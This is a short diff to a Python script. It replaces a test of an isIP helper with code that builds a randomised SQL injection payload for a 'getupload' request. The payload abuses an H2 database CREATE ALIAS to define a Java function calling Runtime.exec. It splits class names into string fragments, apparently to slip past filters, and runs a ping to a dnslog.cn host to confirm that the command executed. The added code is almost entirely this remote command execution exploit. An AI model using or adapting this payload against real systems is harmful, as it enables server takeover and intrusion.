@@ -4,6 +4,7 @@
 
 import asyncio
 import os
+import random
 import re
 import time
 
@@ -116,8 +117,15 @@ def isIP(url):
 
 
 if __name__ == '__main__':
-    flag = isIP('1.1.1.1')
-    print(flag)
+    randomNum = random.randint(10000, 99999)
+
+    formdata = "method=getupload&uploadID=1';CREATE ALIAS cs" + str(
+        randomNum) + " AS CONCAT('void e(String cmd) throws " \
+                     "java.io.IOException{','java.lan','g.Run','time rt=java.la','ng.Ru','ntime.getRu','ntime();rt.ex'," \
+                     "'ec(cmd);}');CALL cs" + str(randomNum) + "('ping Leiloum.dnslog.cn');select+'1 "
+    print(formdata)
+    # flag = isIP('1.1.1.1')
+    # print(flag)
     # l = asyncio.get_event_loop()
     # l.run_until_complete(test())
     # a = A()
